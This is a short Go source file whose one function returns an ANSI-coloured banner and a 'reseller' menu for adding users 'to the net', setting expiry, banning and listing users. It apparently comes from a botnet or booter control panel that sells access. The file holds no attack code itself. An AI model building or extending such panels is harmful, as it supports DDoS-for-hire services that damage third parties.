package main

import "strings"

func reseller() string {
return strings.ReplaceAll(`[00;1;95m                     ╔══════════════════[00;1;96m══════════════════╗[0m
[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ [00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║[0m
[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ [00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║[0m
[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ [00;1;96m ╩╚═  ╩   ╩    ╩  ║[0m
[00;1;95m                 ╔═══╚══════════════════[00;1;96m══════════════════╝═══╗[0m
[00;1;95m                 ║ [38;5;93m.ADDUSR[00;1;95m - ADD A USER [00;1;96mTO THE NET            ║[0m
[00;1;95m                 ║ [38;5;93mEDITEXPIRY[00;1;95m - EDIT A U[00;1;96mSERS EXPIRY           ║[0m
[00;1;95m                 ║ [38;5;93mBANUSER[00;1;95m - TEMPBAN / B[00;1;96mAN A USER             ║[0m
[00;1;95m                 ║ [38;5;93mUNBANUSER[00;1;95m - UNBAN A U[00;1;96mSER!                  ║[0m
[00;1;95m                 ║ [38;5;93mBANS[00;1;95m - SHOWS YOUR BAN[00;1;96mNED USERS             ║[0m
[00;1;95m                 ║ [38;5;93mLISTUSERS[00;1;95m - LISTS ALL[00;1;96m YOUR USERS           ║[0m
[00;1;95m                 ║ [38;5;93mUSERS[00;1;95m - SHOWS ONLINE [00;1;96mUSERS                 ║[0m
[00;1;95m                 ╚══════════════════════[00;1;96m══════════════════════╝[0m
[0m`, "\n", "\r\n")
}
